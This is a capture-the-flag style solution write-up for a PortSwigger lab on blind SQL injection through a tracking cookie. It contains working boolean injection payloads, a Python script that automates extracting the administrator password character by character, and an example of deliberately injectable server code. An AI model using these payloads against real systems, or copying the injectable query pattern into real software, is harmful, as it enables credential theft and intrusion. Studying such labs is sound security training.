# Lab 09: Blind SQL injection with conditional responses

## Description

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

---

## Solution

The SQL injection vulnerable tracking cookie is `TrackingId`, and we can confirm that sending a valid cookie causes the "Welcome Back" message to appear and sending the following cookie causes it to disappear.

```txt
TrackingId=YXLeVeN8Qh1b6wlg'
```

This leads us to believe that the backend server code is something like the following:

```python
tracking_id = request.cookies['TrackingId']
sql_query = f"SELECT TrackingId FROM TrackingIds WHERE TrackingId = '{tracking_id}'"
rows = db.execute(sql_query)
if len(rows) == 0:
	render("Home")
else:
	render("Home", flash="Welcome back!")
```

If the SQL query returns at least one row, then it renders "Welcome back!" More specifically, if the `WHERE` condition is true, it renders "Welcome back!" If we combine a valid `TrackingId` with boolean operations like `AND` and `OR`, we can interrogate the database with arbitrary extra conditions. Since the goal is to determine the password of the `administrator` account, we can iteratively guess each character of `administrator`'s password until we have the whole thing.

First, let's confirm that we can add additional conditions to the original `WHERE` clause.

This cookie results in the condition evaluating to `true` and in "Welcome back!" being rendered.

```txt
TrackingId=YXLeVeN8Qh1b6wlg' AND '1'='1
```

This cookie results in the condition evaluating to `false` and in "Welcome back!" **not** being rendered.

```txt
TrackingId=YXLeVeN8Qh1b6wlg' AND '1'='0
```

This confirms that we can add additional conditions to the original `WHERE` clause to successfully interrogate the database.

Now let's begin guessing each ASCII character in `administrator`'s password using the following cookie as a template:

```txt
TrackingId=YXLeVeN8Qh1b6wlg' AND (SELECT SUBSTRING(password, $INDEX, 1) FROM users WHERE username = 'administrator') = '$CHARACTER'--
```

We can automate this process using the following Python script.

```python
import string
import requests


with open("password.txt", "a") as f:
    for i in range(1, 21):
        for c in string.printable:
            response = requests.get(
                "https://ac301fc21fcaeb2a803c079900d7001e.web-security-academy.net/filter?category=Pets",
                cookies={
                    "TrackingId": f"YXLeVeN8Qh1b6wlg' AND (SELECT SUBSTRING(password, {i}, 1) FROM users WHERE username = 'administrator') = '{c}'--",
                    "session": "MdSXVNrUB4hg70rKQjEWGca6b3SpJYMJ"
                }
            )
            if "Welcome back!" in response.text:
                f.write(c)
                f.flush()
                break
            print(f"[*] Progress: password character index {i}, character {c}", end="\r")
    f.write("\n")
```

This reveals the password `u1qjrhonmiyqxb1td11a` for the `administrator` user.
